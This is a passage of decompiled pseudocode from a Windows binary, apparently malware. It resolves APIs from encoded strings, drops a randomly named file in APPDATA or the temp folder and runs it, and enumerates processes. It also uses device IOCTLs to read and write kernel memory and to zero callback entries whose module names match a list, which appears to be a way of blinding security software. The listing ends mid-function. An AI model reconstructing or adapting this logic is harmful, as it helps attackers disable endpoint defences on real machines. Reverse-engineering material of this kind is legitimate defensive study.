  char *pcVar1;
  longlong lVar2;
  
  do {
    lVar2 = param_3 + -1;
    if (param_3 == 0) {
      *param_1 = 0;
      param_1[1] = 0;
      return;
    }
    pcVar1 = (char *)(param_2 + -1 + param_3);
    param_3 = lVar2;
  } while (*pcVar1 != param_4);
  *param_1 = lVar2;
  *(undefined1 *)(param_1 + 1) = 1;
  return;
}


// ==== FUN_140006d7c @ 140006d7c size 155

undefined8 FUN_140006d7c(void)

{
  int iVar1;
  BOOL BVar2;
  DWORD DVar3;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 local_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 local_48;
  undefined8 uStack_40;
  undefined8 local_38;
  HANDLE local_28;
  HANDLE pvStack_20;
  undefined8 local_18;
  undefined8 uVar4;
  
  uStack_90 = 0;
  local_48 = 0;
  uStack_40 = 0;
  local_58 = 0;
  uStack_50 = 0;
  local_68 = 0;
  uStack_60 = 0;
  local_38 = 0;
  local_78 = 0;
  uStack_70 = 0;
  local_88 = 0;
  uStack_80 = 0;
  local_98 = 0x68;
  local_28 = (HANDLE)0x0;
  pvStack_20 = (HANDLE)0x0;
  local_18 = 0;
  iVar1 = (*DAT_1400340c0)(0,0,0,0,0,0,0,0,&local_98,&local_28);
  if (iVar1 == 0) {
    DVar3 = GetLastError();
    uVar4 = CONCAT44(extraout_var_00,DVar3);
  }
  else {
    CloseHandle(pvStack_20);
    BVar2 = CloseHandle(local_28);
    uVar4 = CONCAT44(extraout_var,BVar2);
  }
  return CONCAT71((int7)((ulonglong)uVar4 >> 8),iVar1 != 0);
}


// ==== FUN_140006e17 @ 140006e17 size 61

longlong *
FUN_140006e17(longlong *param_1,longlong param_2,ulonglong param_3,longlong param_4,longlong param_5
             )

{
  longlong local_28;
  longlong lStack_20;
  
  FUN_140006e54(&local_28,param_2,param_3,0,param_4,param_5);
  *param_1 = local_28;
  param_1[1] = lStack_20;
  return param_1;
}


// ==== FUN_140006e54 @ 140006e54 size 83

void FUN_140006e54(longlong *param_1,longlong param_2,ulonglong param_3,ulonglong param_4,
                  longlong param_5,longlong param_6)

{
  char *pcVar1;
  longlong lVar2;
  longlong lVar3;
  
  if (param_4 < param_3) {
    for (lVar3 = 0; lVar3 != param_3 - param_4; lVar3 = lVar3 + 1) {
      lVar2 = 0;
      while (param_6 != lVar2) {
        pcVar1 = (char *)(param_5 + lVar2);
        lVar2 = lVar2 + 1;
        if (*(char *)(param_2 + param_4 + lVar3) == *pcVar1) {
          *param_1 = lVar3 + param_4;
          *(undefined1 *)(param_1 + 1) = 1;
          return;
        }
      }
    }
  }
  *param_1 = 0;
  param_1[1] = 0;
  return;
}


// ==== FUN_140006ea7 @ 140006ea7 size 231

void FUN_140006ea7(undefined8 param_1,undefined8 param_2,LPCVOID param_3,ulonglong param_4)

{
  HANDLE hFile;
  undefined8 uVar1;
  undefined1 local_278 [260];
  CHAR local_174 [260];
  LPSTR local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  LPCSTR local_50 [2];
  short local_40;
  DWORD local_34;
  
  uVar1 = param_2;
  local_70 = FUN_14000714e(local_174);
  local_68 = uVar1;
  local_60 = param_1;
  local_58 = param_2;
  FUN_140006959(local_50,local_278,(longlong *)&local_70);
  if (local_40 == 0) {
    hFile = CreateFileA(local_50[0],0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffffffffffff) {
      local_34 = 0;
      WriteFile(hFile,param_3,(DWORD)param_4,&local_34,(LPOVERLAPPED)0x0);
      CloseHandle(hFile);
      if (param_4 == local_34) {
        FUN_140006d7c();
      }
    }
  }
  return;
}


// ==== FUN_140006f8e @ 140006f8e size 147

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 * FUN_140006f8e(undefined8 *param_1,undefined8 param_2,longlong *param_3)

{
  undefined8 uVar1;
  short sVar2;
  undefined **local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  
  local_30 = &PTR_FUN_140017348;
  local_20 = 0x40;
  local_18 = 0;
  local_28 = param_2;
  sVar2 = FUN_1400055ea(&local_30,*param_3,param_3[1],0x140017320);
  if ((sVar2 == 0) && (sVar2 = FUN_14000541c(&local_30,0x14001950d,4), sVar2 == 0)) {
    *(undefined2 *)(param_1 + 2) = 0;
    *param_1 = local_28;
    param_1[1] = local_18;
    return param_1;
  }
  uVar1 = _UNK_140017310;
  *param_1 = _DAT_140017308;
  param_1[1] = uVar1;
  param_1[2] = 3;
  return param_1;
}


// ==== FUN_140007021 @ 140007021 size 48

void FUN_140007021(undefined8 *param_1,undefined8 param_2,longlong param_3)

{
  if (param_3 != 0) {
    (**(code **)(param_1[1] + 0x18))(*param_1,param_2,param_3,0);
  }
  return;
}


// ==== FUN_140007051 @ 140007051 size 110

longlong * FUN_140007051(longlong *param_1,undefined8 *param_2,undefined8 param_3)

{
  longlong lVar1;
  longlong *plVar2;
  longlong local_78;
  undefined8 uStack_70;
  undefined2 local_68;
  longlong local_60 [2];
  short local_50;
  undefined8 local_48;
  undefined8 uStack_40;
  longlong local_30;
  short local_28;
  
  local_48 = *param_2;
  uStack_40 = param_2[1];
  FUN_1400070bf(&local_30,&local_48,param_3);
  if (local_28 == 0) {
    plVar2 = &local_78;
    local_68 = 0;
    local_78 = local_30;
    uStack_70 = param_3;
  }
  else {
    plVar2 = local_60;
    local_50 = local_28;
  }
  param_1[2] = plVar2[2];
  lVar1 = plVar2[1];
  *param_1 = *plVar2;
  param_1[1] = lVar1;
  return param_1;
}


// ==== FUN_1400070bf @ 1400070bf size 81

/* WARNING: Removing unreachable block (ram,0x0001400070d3) */

longlong * FUN_1400070bf(longlong *param_1,undefined8 *param_2,undefined8 param_3)

{
  longlong lVar1;
  
  lVar1 = (**(code **)param_2[1])(*param_2,param_3,0);
  *param_1 = lVar1;
  *(ushort *)(param_1 + 1) = (ushort)(lVar1 == 0);
  *(undefined4 *)((longlong)param_1 + 10) = 0;
  *(undefined2 *)((longlong)param_1 + 0xe) = 0;
  return param_1;
}


// ==== FUN_140007110 @ 140007110 size 62

longlong FUN_140007110(longlong param_1)

{
  ulonglong local_30 [2];
  
  FUN_14000662b(local_30,param_1,0x18);
  return param_1;
}


// ==== FUN_14000714e @ 14000714e size 92

LPSTR FUN_14000714e(LPSTR param_1)

{
  DWORD DVar1;
  LPSTR pCVar2;
  
  DVar1 = GetEnvironmentVariableA("APPDATA",param_1,0x104);
  if (DVar1 - 1 < 0x102) {
    param_1[DVar1] = '\\';
    return param_1;
  }
  GetTempPathA(0x104,param_1);
  pCVar2 = (LPSTR)FUN_1400071fd((longlong)param_1);
  return pCVar2;
}


// ==== FUN_1400071aa @ 1400071aa size 83

void FUN_1400071aa(ulonglong *param_1,longlong param_2,longlong param_3)

{
  ulonglong uVar1;
  longlong lVar2;
  
  for (lVar2 = 0; param_3 != lVar2; lVar2 = lVar2 + 1) {
    uVar1 = *param_1 * 0x5851f42d4c957f2d + 0x14057b7ef767814f;
    *param_1 = uVar1;
    *(char *)(param_2 + lVar2) = "abcdefghijklmnopqrstuvwxyz0123456789"[uVar1 % 0x24];
  }
  return;
}


// ==== FUN_1400071fd @ 1400071fd size 67

longlong FUN_1400071fd(longlong param_1)

{
  ulonglong local_30 [2];
  
  FUN_14000662b(local_30,param_1,0x104);
  return param_1;
}


// ==== FUN_140007240 @ 140007240 size 46

ulonglong FUN_140007240(void)

{
  DWORD DVar1;
  DWORD DVar2;
  undefined1 local_11;
  
  DVar1 = GetTickCount();
  DVar2 = GetCurrentProcessId();
  return CONCAT44(DVar2,DVar1) ^ (ulonglong)&local_11;
}


// ==== FUN_14000726e @ 14000726e size 1969

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000726e(void)

{
  LPCSTR pCVar1;
  HMODULE pHVar2;
  undefined1 local_d8 [128];
  undefined1 local_58 [64];
  
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x14001954d,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034038 = (FARPROC)0x0;
  }
  else {
    DAT_140034038 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x14001955b,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034040 = (FARPROC)0x0;
  }
  else {
    DAT_140034040 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019569,0xc);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034048 = (FARPROC)0x0;
  }
  else {
    DAT_140034048 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019575,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034050 = (FARPROC)0x0;
  }
  else {
    DAT_140034050 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019582,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034058 = (FARPROC)0x0;
  }
  else {
    DAT_140034058 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019594,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034060 = (FARPROC)0x0;
  }
  else {
    DAT_140034060 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195a6,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034068 = (FARPROC)0x0;
  }
  else {
    DAT_140034068 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195b3,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034070 = (FARPROC)0x0;
  }
  else {
    DAT_140034070 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195c1,0x10);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034078 = (FARPROC)0x0;
  }
  else {
    DAT_140034078 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195d1,0x15);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034080 = (FARPROC)0x0;
  }
  else {
    DAT_140034080 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195e6,0x15);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034088 = (FARPROC)0x0;
  }
  else {
    DAT_140034088 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x1400195fb,0xf);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_140034090 = (FARPROC)0x0;
  }
  else {
    _DAT_140034090 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x14001960a,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_140034098 = (FARPROC)0x0;
  }
  else {
    _DAT_140034098 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019618,0xb);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_1400340a0 = (FARPROC)0x0;
  }
  else {
    _DAT_1400340a0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x14001962f,0xc);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340a8 = (FARPROC)0x0;
  }
  else {
    DAT_1400340a8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x14001963b,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340b0 = (FARPROC)0x0;
  }
  else {
    DAT_1400340b0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019649,0xc);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340b8 = (FARPROC)0x0;
  }
  else {
    DAT_1400340b8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019655,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340c0 = (FARPROC)0x0;
  }
  else {
    DAT_1400340c0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019663,0x13);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340c8 = (FARPROC)0x0;
  }
  else {
    DAT_1400340c8 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_58,0x140019623,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_1400056d3((longlong)local_d8,0x140019676,0x10);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_1400340d0 = (FARPROC)0x0;
  }
  else {
    DAT_1400340d0 = GetProcAddress(pHVar2,pCVar1);
  }
  return;
}


// ==== FUN_140007a1f @ 140007a1f size 69

undefined8 FUN_140007a1f(void)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  undefined8 uVar4;
  undefined8 uStackX_20;
  undefined8 uStack_10;
  
  uStack_10 = 0x140007a2a;
  uVar3 = FUN_14000d5c2();
  lVar1 = -uVar3;
  *(undefined4 *)(&stack0x00002024 + lVar1) = 0;
  *(undefined8 *)((longlong)&uStack_10 + lVar1) = 0x140007a4f;
  iVar2 = (*DAT_1400342d8)((longlong)&uStackX_20 + lVar1,0x2000);
  if (iVar2 == 0) {
    uVar4 = 0;
  }
  else {
    uVar4 = *(undefined8 *)((longlong)&uStackX_20 + lVar1);
  }
  return uVar4;
}


// ==== FUN_140007a64 @ 140007a64 size 217

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140007a64(longlong param_1,longlong param_2,longlong param_3,ulonglong param_4)

{
  bool bVar1;
  longlong lVar2;
  longlong lVar3;
  ulonglong uVar4;
  longlong lVar5;
  longlong lVar6;
  byte bVar7;
  undefined1 local_138 [256];
  
  lVar2 = FUN_140007dd5(param_1 + param_2);
  if (lVar2 != 0) {
    lVar2 = lVar2 + _DAT_140034240;
    lVar3 = FUN_140007dd5(lVar2);
    if (lVar3 != 0 && lVar3 != lVar2) {
      bVar7 = 0;
      for (; (lVar3 != lVar2 && (lVar3 != 0)); lVar3 = FUN_140007dd5(lVar3)) {
        uVar4 = FUN_140007dd5(lVar3 + 0x28);
        if (uVar4 != 0) {
          lVar6 = param_3;
          bVar1 = FUN_140007bea(uVar4,param_3,param_4,local_138);
          if (bVar1) {
            lVar5 = FUN_140007ba7((longlong)local_138);
            bVar1 = FUN_140007b3d(lVar5,lVar6);
            bVar7 = bVar7 | bVar1;
          }
        }
      }
      if (bVar7 != 0) {
        FUN_140007ce2(lVar2,lVar2);
        FUN_140007ce2(lVar2 + 8,lVar2);
      }
    }
  }
  return;
}


// ==== FUN_140007b3d @ 140007b3d size 106

bool FUN_140007b3d(longlong param_1,longlong param_2)

{
  longlong lVar1;
  byte bVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong *puVar5;
  undefined1 local_70 [64];
  
  puVar5 = &DAT_140019778;
  uVar4 = 0;
  do {
    uVar3 = uVar4;
    if (uVar3 == 0x14) break;
    uVar4 = puVar5[-1];
    lVar1 = FUN_14000ae64((longlong)local_70,uVar4,*puVar5);
    bVar2 = FUN_140006a0a(lVar1,uVar4,param_1,param_2);
    puVar5 = puVar5 + 2;
    uVar4 = uVar3 + 1;
  } while ((bVar2 & 1) == 0);
  return uVar3 < 0x14;
}


// ==== FUN_140007ba7 @ 140007ba7 size 67

longlong FUN_140007ba7(longlong param_1)

{
  ulonglong local_30 [2];
  
  FUN_14000662b(local_30,param_1,0x100);
  return param_1;
}


// ==== FUN_140007bea @ 140007bea size 82

bool FUN_140007bea(ulonglong param_1,longlong param_2,ulonglong param_3,undefined1 *param_4)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar2 = 1;
  do {
    if (param_3 <= uVar2) {
      *param_4 = 0;
LAB_140007c2e:
      return uVar2 < param_3;
    }
    uVar1 = *(ulonglong *)(param_2 + -8 + uVar2 * 8);
    if ((uVar1 <= param_1) && (param_1 < *(ulonglong *)(param_2 + uVar2 * 8))) {
      (*DAT_1400342e0)(uVar1,param_4,0x100);
      goto LAB_140007c2e;
    }
    uVar2 = uVar2 + 1;
  } while( true );
}


// ==== FUN_140007c3c @ 140007c3c size 166

void FUN_140007c3c(longlong param_1,longlong param_2,longlong param_3,ulonglong param_4)

{
  longlong lVar1;
  bool bVar2;
  ulonglong uVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  undefined1 local_138 [256];
  
  for (lVar6 = 0; lVar6 != 0x200; lVar6 = lVar6 + 8) {
    lVar1 = param_1 + param_2 + lVar6;
    uVar3 = FUN_140007dd5(lVar1);
    if (uVar3 != 0) {
      uVar3 = FUN_140007dd5(uVar3 & 0xfffffffffffffff0 | 8);
      if (uVar3 != 0) {
        lVar5 = param_3;
        bVar2 = FUN_140007bea(uVar3,param_3,param_4,local_138);
        if (bVar2) {
          lVar4 = FUN_140007ba7((longlong)local_138);
          bVar2 = FUN_140007b3d(lVar4,lVar5);
          if (bVar2) {
            FUN_140007ce2(lVar1,0);
          }
        }
      }
    }
  }
  return;
}


// ==== FUN_140007ce2 @ 140007ce2 size 147

void FUN_140007ce2(undefined8 param_1,undefined8 param_2)

{
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 *puStack_50;
  undefined8 local_48;
  undefined8 uStack_40;
  undefined4 local_2c;
  
  local_48 = 0;
  uStack_40 = 0;
  local_58 = 0;
  puStack_50 = (undefined8 *)0x0;
  local_68 = 0;
  uStack_60 = 0;
  local_2c = 0;
  FUN_140007d75();
  puStack_50 = DAT_140034348;
  *DAT_140034348 = param_2;
  uStack_40 = CONCAT44(uStack_40._4_4_,8);
  local_58 = param_1;
  (*DAT_1400342e8)(DAT_140034030,0x80002014,&local_68,0x30,&local_68,0x30,&local_2c,0);
  return;
}


// ==== FUN_140007d75 @ 140007d75 size 96

void FUN_140007d75(void)

{
  if (DAT_140034350 == 0) {
    DAT_140034350 = (*DAT_1400342f0)(0,0x1000,0x3000,4);
  }
  if (DAT_140034348 == 0) {
    DAT_140034348 = (*DAT_1400342f0)(0,0x1000,0x3000,4);
  }
  return;
}


// ==== FUN_140007dd5 @ 140007dd5 size 136

undefined8 FUN_140007dd5(undefined8 param_1)

{
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 local_48;
  undefined8 uStack_40;
  undefined8 *local_38;
  undefined8 uStack_30;
  undefined4 local_24;
  
  local_38 = (undefined8 *)0x0;
  uStack_30 = 0;
  local_48 = 0;
  uStack_40 = 0;
  local_58 = 0;
  uStack_50 = 0;
  local_24 = 0;
  FUN_140007d75();
  local_38 = DAT_140034350;
  uStack_30 = CONCAT44(uStack_30._4_4_,8);
  local_48 = param_1;
  (*DAT_1400342e8)(DAT_140034030,0x80002028,&local_58,0x30,&local_58,0x30,&local_24,0);
  return *DAT_140034350;
}


// ==== FUN_140007e5d @ 140007e5d size 105

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_140007e5d(longlong param_1,int param_2)

{
  undefined8 uVar1;
  longlong lVar2;
  longlong lVar3;
  longlong lVar4;
  
  lVar3 = param_1 + _DAT_1400341e8;
  lVar2 = lVar3;
  while( true ) {
    lVar4 = lVar2 - _DAT_1400341e8;
    uVar1 = FUN_140007dd5(DAT_1400341e0 + lVar4);
    if (param_2 == (int)uVar1) {
      return lVar4;
    }
    lVar2 = FUN_140007dd5(lVar2);
    if (lVar2 == 0) break;
    if (lVar2 == lVar3) {
      return 0;
    }
  }
  return 0;
}


// ==== FUN_140007ec6 @ 140007ec6 size 130

void FUN_140007ec6(undefined8 param_1)

{
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 local_48;
  undefined1 *puStack_40;
  undefined8 local_38;
  undefined8 uStack_30;
  undefined4 local_24;
  
  local_38 = 0;
  uStack_30 = 0;
  local_48 = 0;
  puStack_40 = (undefined1 *)0x0;
  local_58 = 0;
  uStack_50 = 0;
  local_24 = 0;
  FUN_140007d75();
  puStack_40 = DAT_140034348;
  *DAT_140034348 = 0;
  uStack_30 = CONCAT44(uStack_30._4_4_,1);
  local_48 = param_1;
  (*DAT_1400342e8)(DAT_140034030,0x80002014,&local_58,0x30,&local_58,0x30,&local_24,0);
  return;
}


// ==== FUN_140007f48 @ 140007f48 size 223

undefined4 FUN_140007f48(longlong param_1,longlong param_2)

{
  byte bVar1;
  int iVar2;
  HANDLE hObject;
  longlong lVar3;
  undefined4 uVar4;
  ulonglong uVar5;
  undefined4 *puVar6;
  undefined4 local_180 [2];
  undefined4 local_178;
  undefined1 local_154 [260];
  ulonglong local_50;
  char local_48;
  
  uVar4 = 0;
  hObject = (HANDLE)(*DAT_1400342f8)(2,0);
  if (hObject != (HANDLE)0xffffffffffffffff) {
    puVar6 = local_180;
    for (lVar3 = 0x130; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined1 *)puVar6 = 0;
      puVar6 = (undefined4 *)((longlong)puVar6 + 1);
    }
    local_180[0] = 0x130;
    iVar2 = (*DAT_140034300)(hObject);
    uVar4 = 0;
    if (iVar2 != 0) {
      do {
        FUN_14000662b(&local_50,(longlong)local_154,0x104);
        uVar5 = 0x104;
        if (local_48 != '\0') {
          uVar5 = local_50;
        }
        bVar1 = FUN_140006a0a((longlong)local_154,uVar5,param_1,param_2);
        uVar4 = local_178;
        if ((bVar1 & 1) != 0) goto LAB_140008009;
        iVar2 = (*DAT_140034308)(hObject,local_180);
      } while (iVar2 != 0);
      uVar4 = 0;
    }
LAB_140008009:
    CloseHandle(hObject);
  }
  return uVar4;
}


// ==== FUN_140008027 @ 140008027 size 850

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_140008027(undefined8 param_1,ulonglong param_2,ulonglong param_3,longlong param_4,
                       longlong param_5,ulonglong *param_6)

{
  short sVar1;
  short sVar2;
  short sVar3;
  short sVar4;
  short sVar5;
  short sVar6;
  short sVar7;
  short sVar8;
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  HLOCAL hMem;
  uint uVar11;
  byte bVar12;
  int iVar13;
  uint *puVar14;
  undefined1 (*pauVar15) [16];
  ulonglong uVar16;
  uint3 *puVar17;
  ulonglong uVar18;
  ulonglong uVar19;
  ulonglong uVar20;
  ulonglong uVar21;
  undefined1 auVar22 [16];
  undefined1 auVar23 [16];
  undefined8 local_1c8 [32];
  longlong local_c8;
  ulonglong local_c0;
  undefined8 local_b8;
  uint *local_b0;
  short local_a4;
  byte local_a2;
  undefined2 local_a0;
  byte local_9e;
  short local_9c;
  HLOCAL local_98;
  ushort local_8c;
  undefined2 local_8a;
  uint local_88;
  uint local_84;
  ushort local_80;
  undefined1 local_7e;
  undefined2 local_7c;
  byte local_7a;
  
  local_84 = 0;
  local_c8 = param_4;
  iVar13 = (*DAT_140034270)(param_1,param_2,param_3,0xd,&local_84);
  uVar11 = local_84;
  if ((iVar13 == 0) || (puVar14 = calloc(1,(ulonglong)local_84 * 4 + 0xc), puVar14 == (uint *)0x0))
  {
    uVar21 = 0;
  }
  else {
    *puVar14 = uVar11;
    iVar13 = (*DAT_140034270)(param_1,param_2,param_3 & 0xffffffff,7,puVar14);
    auVar10 = _DAT_140017050;
    auVar9 = _DAT_140017040;
    if (iVar13 != 0) {
      local_c0 = param_2;
      local_b8 = param_1;
      local_b0 = puVar14;
      for (uVar21 = 0; uVar21 < local_84; uVar21 = uVar21 + 1) {
        local_98 = (HLOCAL)0x0;
        uVar18 = param_2;
        iVar13 = (*DAT_140034270)(param_1,param_2,puVar14[uVar21 + 2],1,&local_98);
        hMem = local_98;
        if ((iVar13 != 0) && (local_98 != (HLOCAL)0x0)) {
          pauVar15 = (undefined1 (*) [16])FUN_140008379((longlong)local_98);
          uVar20 = uVar18 * 2;
          uVar19 = 0;
          for (uVar16 = uVar18; 7 < uVar16; uVar16 = uVar16 - 8) {
            auVar22 = psubusw(auVar9,*pauVar15);
            auVar23._0_2_ = -(ushort)(auVar22._0_2_ == 0);
            auVar23._2_2_ = -(ushort)(auVar22._2_2_ == 0);
            auVar23._4_2_ = -(ushort)(auVar22._4_2_ == 0);
            auVar23._6_2_ = -(ushort)(auVar22._6_2_ == 0);
